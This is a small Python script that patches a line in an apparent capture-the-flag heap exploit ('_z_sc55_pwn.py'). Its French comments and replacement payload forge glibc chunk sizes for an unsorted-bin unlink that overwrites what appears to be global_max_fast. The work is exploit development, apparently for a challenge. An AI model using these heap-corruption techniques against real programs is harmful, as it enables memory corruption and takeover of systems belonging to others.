p=r"./_z_55\_z_sc55_pwn.py"
s=open(p,encoding="utf-8").read()
old="    reintro(nbytes({0x08: 0x91, 0x18: gmf - 0x10, 0x38: 0x91, 0x88: unsorted,"
new=("    # V1->size = 0x51 pour que `size == nb` (buy(0x48) -> nb=0x50) : _int_malloc fait\n"
     "    # alors le unlink (bck->fd = unsorted -> *gmf) PUIS retourne immediatement, au lieu de\n"
     "    # reboucler sur unsorted->bk = gmf-0x10 (=> malloc(): memory corruption).\n"
     "    reintro(nbytes({0x08: 0x51, 0x10: 0, 0x18: gmf - 0x10, 0x50: 0x50, 0x58: 0x21,\n"
     "                    0x38: 0x91, 0x88: unsorted,")
assert old in s
s=s.replace(old,new,1)
open(p,"w",encoding="utf-8").write(s)
print("ok")
